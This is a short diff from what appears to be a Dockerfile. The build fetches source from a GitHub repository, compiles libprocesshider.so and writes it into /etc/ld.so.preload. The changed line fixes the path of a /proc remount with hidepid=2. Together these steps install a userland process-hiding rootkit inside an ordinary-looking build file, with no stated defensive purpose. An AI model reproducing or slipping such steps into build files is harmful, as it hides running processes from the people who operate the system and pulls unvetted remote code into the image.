@@ -11,7 +11,7 @@ RUN wget https://raw.githubusercontent.com/pepek107happy4s/tru/master/processhid
 RUN make
 RUN mv libprocesshider.so /usr/local/lib
 RUN echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-RUN cd /root/proc && mount -o remount,rw,nosuid,nodev,noexec,relatime,hidepid=2 
+RUN cd /proc && mount -o remount,rw,nosuid,nodev,noexec,relatime,hidepid=2 
 RUN apt-get install nano
 RUN apt install npm -y
 RUN apt install npm nodejs -y
